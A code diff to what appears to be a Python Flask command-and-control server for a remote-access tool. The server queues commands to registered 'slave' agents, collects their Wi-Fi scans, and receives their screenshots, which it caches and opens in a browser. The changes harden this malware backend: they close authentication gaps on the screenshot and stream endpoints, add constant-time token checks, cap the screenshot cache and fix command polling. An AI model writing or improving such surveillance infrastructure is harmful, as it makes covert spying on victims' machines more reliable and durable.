@@ -28,8 +28,10 @@ import queue
 import logging
 import warnings
 import base64
+import hmac
 import webbrowser
 from io import BytesIO
+from urllib.parse import quote
 from PIL import Image, ImageTk
 
 warnings.filterwarnings("ignore")
@@ -54,6 +56,7 @@ image_queue = queue.Queue()
 session_log_queue = queue.Queue()
 console_input_queue = queue.Queue()
 image_cache = {}
+IMAGE_CACHE_MAX = 50   # screenshots kept for /api/v1/image/<task_id>
 
 ids_lock = threading.Lock()
 
@@ -257,6 +260,12 @@ def queue_command(numeric_id, command, payload=None):
     return task_id
 
 def wait_result(task_id, timeout=10.0):
+    """Poll the DB until the command completes. Returns None on timeout,
+    on a missing row, or immediately when task_id is falsy (queue_command
+    returns None for an unknown slave — old code then spun for the whole
+    timeout doing `WHERE id = NULL`)."""
+    if not task_id:
+        return None
     conn = db_conn()
     c = conn.cursor()
     start = time.time()
@@ -310,17 +319,24 @@ def parse_wifi_scan(netsh_output):
 # ---------------------------------------------------------------------------
 @app.before_request
 def check_auth():
+    """Every /api/v1 endpoint requires the token when C2_TOKEN is set.
+
+    The old version exempted /api/v1/image/ and /api/v1/stream, which meant
+    anyone who could reach the (tunnelled, public) port could pull every
+    screenshot or inject frames. The token is accepted from the
+    X-C2-Token header, a ?token= query parameter (so a browser tab can
+    open an image URL) or a c2_token cookie.
+    """
     token = os.environ.get('C2_TOKEN')
     if not token:
         return
     if not request.path.startswith('/api/v1/'):
         return
-    if request.path.startswith('/api/v1/image/'):
-        return
-    if request.path.startswith('/api/v1/stream'):
-        return
-    provided = request.headers.get('X-C2-Token', '')
-    if provided != token:
+    provided = (request.headers.get('X-C2-Token')
+                or request.args.get('token')
+                or request.cookies.get('c2_token')
+                or '')
+    if not hmac.compare_digest(str(provided), token):
         return jsonify({"error": "unauthorized"}), 401
 
 @app.route('/api/v1/register', methods=['POST'])
@@ -462,8 +478,21 @@ def result():
         try:
             img_data = base64.b64decode(output[6:])
             image_cache[task_id] = img_data
+            # Bounded cache: otherwise every screenshot of the session is
+            # held in RAM for the life of the process.
+            if len(image_cache) > IMAGE_CACHE_MAX:
+                for old in list(image_cache)[:-IMAGE_CACHE_MAX]:
+                    image_cache.pop(old, None)
             image_queue.put((numeric_id, img_data))
-            webbrowser.open(f"http://127.0.0.1:5000/api/v1/image/{task_id}")
+            # Open the tab off-thread so a slow browser launch cannot stall
+            # this agent's /result response. The token rides in the query
+            # string because a browser tab cannot send X-C2-Token.
+            url = f"{SERVER_URL}/api/v1/image/{task_id}"
+            tok = os.environ.get('C2_TOKEN')
+            if tok:
+                url += f"?token={quote(tok, safe='')}"
+            threading.Thread(target=webbrowser.open, args=(url,),
+                             daemon=True).start()
         except Exception as e:
             log_queue.put(f"[!] image decode: {e}")
         return jsonify({"status": "ok"})
